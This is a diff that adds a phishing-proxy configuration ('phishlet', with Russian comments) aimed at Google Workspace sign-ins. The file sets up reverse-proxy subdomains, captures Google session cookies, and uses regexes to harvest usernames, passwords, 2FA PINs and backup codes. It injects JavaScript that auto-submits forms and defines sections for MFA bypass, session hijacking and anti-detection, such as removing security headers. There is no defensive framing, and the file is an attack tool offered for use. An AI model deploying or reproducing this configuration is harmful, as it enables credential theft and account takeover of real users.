@@ -1,0 +1,189 @@
+# Google Workspace Phishlet
+# Полная конфигурация для перехвата Google Workspace
+
+id: google_workspace
+author: PhantomSec Labs
+description: Google Workspace (G Suite) - Full OAuth 2.0 + 2FA Bypass
+min_ver: 2.3.0
+
+proxy_hosts:
+  - phish_sub: accounts
+    orig_sub: accounts
+    domain: google.com
+    session: true
+    is_landing: true
+
+  - phish_sub: myaccount
+    orig_sub: myaccount
+    domain: google.com
+    session: true
+    is_landing: false
+
+  - phish_sub: drive
+    orig_sub: drive
+    domain: google.com
+    session: false
+    is_landing: false
+
+  - phish_sub: mail
+    orig_sub: mail
+    domain: google.com
+    session: false
+    is_landing: false
+
+sub_filters:
+  - triggers_on: accounts.google.com
+    orig_sub: accounts
+    domain: google.com
+    search: 'https://{orig_sub}.{domain}'
+    replace: 'https://{phish_sub}.{domain}'
+    mimes:
+      - text/html
+      - application/javascript
+    redirect_only: false
+
+  - triggers_on: myaccount.google.com
+    orig_sub: myaccount
+    domain: google.com
+    search: 'https://{orig_sub}.{domain}'
+    replace: 'https://{phish_sub}.{domain}'
+    mimes:
+      - text/html
+      - application/javascript
+    redirect_only: false
+
+auth_tokens:
+  - domain: '.google.com'
+    keys:
+      - 'SID'
+      - 'HSID'
+      - 'SSID'
+      - 'APISID'
+      - 'SAPISID'
+      - 'OSID'
+      - 'NID'
+
+credentials:
+  username:
+    key: 'identifier'
+    search: '<input.*?name=["\']identifier["\'].*?value=["\']([^"\']*)["\']'
+    type: 'post'
+
+  password:
+    key: 'password'
+    search: '<input.*?name=["\']password["\'].*?value=["\']([^"\']*)["\']'
+    type: 'post'
+
+  custom:
+    - key: '2fa_code'
+      search: '<input.*?name=["\']pin["\'].*?value=["\']([^"\']*)["\']'
+      type: 'post'
+
+    - key: 'backup_code'
+      search: '<input.*?name=["\']backupCode["\'].*?value=["\']([^"\']*)["\']'
+      type: 'post'
+
+auth_urls:
+  - '/o/oauth2/v2/auth'
+  - '/o/oauth2/auth'
+  - '/ServiceLogin'
+  - '/b/0/verifyphone'
+
+login:
+  domain: 'accounts.google.com'
+  path: '/o/oauth2/v2/auth'
+  method: 'GET'
+  parameters:
+    - name: 'client_id'
+      value: '216296090215-0gqq8lnj040lk26j8rd7nqf4v2e9h8ia.apps.googleusercontent.com'
+    - name: 'response_type'
+      value: 'code'
+    - name: 'redirect_uri'
+      value: 'https://developers.google.com/oauthplayground'
+    - name: 'scope'
+      value: 'https://www.googleapis.com/auth/userinfo.email https://www.googleapis.com/auth/userinfo.profile'
+    - name: 'state'
+      value: '{random_state}'
+    - name: 'access_type'
+      value: 'offline'
+    - name: 'prompt'
+      value: 'consent'
+
+js_inject:
+  - triggers_on: 'accounts.google.com'
+    js: |
+      // Remove Google branding
+      var logos = document.querySelectorAll('[aria-label="Google"]');
+      logos.forEach(function(logo) { logo.style.display = 'none'; });
+
+  - triggers_on: 'accounts.google.com'
+    js: |
+      // Auto-advance forms
+      document.addEventListener('DOMContentLoaded', function() {
+        var inputs = document.querySelectorAll('input[type="email"], input[type="password"]');
+        inputs.forEach(function(input) {
+          input.addEventListener('blur', function() {
+            setTimeout(function() {
+              var nextBtn = document.querySelector('button[type="submit"]');
+              if (nextBtn) nextBtn.click();
+            }, 500);
+          });
+        });
+      });
+
+force_post:
+  - path: '/_/signin/sl/lookup'
+    search:
+      - key: 'identifier'
+        value: '.*'
+    force:
+      - key: 'TrustAccount'
+        value: 'true'
+    type: 'post'
+
+  - path: '/_/signin/sl/challenge'
+    search:
+      - key: 'password'
+        value: '.*'
+    force:
+      - key: 'TrustAccount'
+        value: 'true'
+    type: 'post'
+
+# 2FA/MFA Bypass
+mfa_bypass:
+  enabled: true
+  methods:
+    - name: 'SMS'
+      trigger: 'text me'
+      capture_field: 'pin'
+
+    - name: 'Voice Call'
+      trigger: 'call me'
+      capture_field: 'pin'
+
+    - name: 'Backup Codes'
+      trigger: 'try another way'
+      capture_field: 'backupCode'
+
+# Session hijacking
+session_hijack:
+  enabled: true
+  cookie_names:
+    - 'SID'
+    - 'HSID'
+    - 'SSID'
+  replay_delay: 1000
+  concurrent_sessions: true
+
+# Redirect
+redirect:
+  enabled: true
+  url: 'https://drive.google.com'
+  delay: 2000
+
+# Anti-detection
+anti_detection:
+  remove_security_headers: true
+  fake_cert_transparency: true
+  randomize_response_timing: true
